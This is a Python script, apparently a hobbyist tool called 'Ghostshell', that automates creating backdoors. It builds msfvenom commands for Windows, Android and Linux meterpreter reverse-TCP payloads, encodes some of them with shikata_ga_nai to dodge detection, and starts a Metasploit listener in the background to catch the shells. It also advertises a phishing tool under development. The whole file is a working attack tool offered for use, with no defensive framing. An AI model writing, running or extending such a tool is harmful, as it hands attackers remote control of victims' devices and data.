# created by unixtail09 
import subprocess
import time as t
import os
import random
import sys
import itertools
import threading

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def run_intro():
    clear()
    print("""
██████╗░██╗░░░██╗███╗░░██╗██╗██╗░░██╗████████╗░█████╗░██╗██╗░░░░░
██╔══██╗██║░░░██║████╗░██║██║██║░██╔╝╚══██╔══╝██╔══██╗██║██║░░░░░
██████╦╝██║░░░██║██╔██╗██║██║█████═╝░░░░██║░░░███████║██║██║░░░░░
██╔══██╗██║░░░██║██║╚████║██║██╔═██╗░░░░██║░░░██╔══██║██║██║░░░░░
██████╦╝╚██████╔╝██║░╚███║██║██║░╚██╗░░░██║░░░██║░░██║██║███████╗
╚═════╝░░╚═════╝░╚═╝░░╚══╝╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚══════╝
                💻 Coded by UnixTail 💻
    """)
    t.sleep(2)

def loading_animation(msg="Creating Payload"):
    done_flag = [False]
    def animate():
        for c in itertools.cycle(['|', '/', '-', '\\']):
            if done_flag[0]:
                break
            sys.stdout.write(f'\r{msg}... {c}')
            sys.stdout.flush()
            t.sleep(0.1)
        sys.stdout.write('\r✅ Payload Created Successfully!     \n')
    t1 = threading.Thread(target=animate)
    t1.start()
    return t1, lambda: done_flag.__setitem__(0, True)

def create_listener(ip, port):
    rc_content = f"""
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST {ip}
set LPORT {port}
set ExitOnSession false 
exploit -j
"""
    with open("listener.rc", "w") as f:
        f.write(rc_content)
    subprocess.Popen(["msfconsole", "-r", "listener.rc"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def run_outro():
    t.sleep(1)
    clear()
    print("""
╔═╗┌─┐┌┬┐┬ ┬┌─┐┬ ┬┌┬┐┬┌─┐
╠╣ │ │││││ │├┤ │ │ ││││ ┬
╚  └─┘┴ ┴└─┘└  └─┘─┴┘┴└─┘
   🔥 Thanks for using Ghostshell 🔥
         🛠️ UnixTail09 🛠️
""")

def main():
    run_intro()
    print("[*] OPENING...... [*]")
    t.sleep(2)
    clear()

    print("""
    [1] Create a Backdoor
    [2] Phishing Tool (under development)
    """)
    a = input("\nChoose an option >>> ")
    clear()

    if a == "1":
        print("1. Backdoor for Windows")
        print("2. Backdoor for Android")
        print("3. Backdoor for Linux (x86 only)")

        backdoor = input("\nChoose a platform >>> ")
        clear()

        ip = input("Input LHOST/IP: ")
        port = input("Input Port: ")
        name = input("Enter output filename: ")

        if backdoor == "1":
            cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 5 -f exe > {name}"
            t_anim, stop_anim = loading_animation("Creating Windows Payload")
        elif backdoor == "2":
            cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f apk > {name}"
            t_anim, stop_anim = loading_animation("Creating Android Payload")
        elif backdoor == "3":
            cmd = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 5 -f elf > {name}"
            t_anim, stop_anim = loading_animation("Creating Linux Payload")
        else:
            print("Invalid option selected!")
            return

        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).wait()
        stop_anim()
        t_anim.join()
        create_listener(ip, port)
        print("\n[*] Listener started in background!")

    elif a == "2":
        print("Phishing tool is still under development. Coming soon!")
    else:
        print("Invalid main menu option!")

    run_outro()

if __name__ == "__main__":
    main()
